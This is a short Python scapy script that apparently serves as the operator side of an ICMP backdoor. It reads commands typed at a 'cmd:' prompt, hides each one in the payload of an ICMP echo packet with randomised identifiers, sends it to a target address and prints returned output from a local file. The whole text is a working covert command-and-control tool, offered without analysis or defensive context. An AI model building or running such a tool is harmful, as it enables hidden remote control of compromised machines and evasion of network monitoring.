from scapy.all import *
from random import randint
from time import sleep
def send(re_data):
    b = re_data.encode('utf-8')
    target_ip = "" #目标IP地址
    ip = IP(dst=target_ip,ttl=64,id=randint(1,65535))/ICMP(id=randint(1,65535),seq=randint(1,65535))/b
    sr1(ip,verbose=0)
    sleep(2)
    with open('./data.txt','r') as fp:
        print(fp.read())
while 1:
    a = input("cmd:")
    send(a)
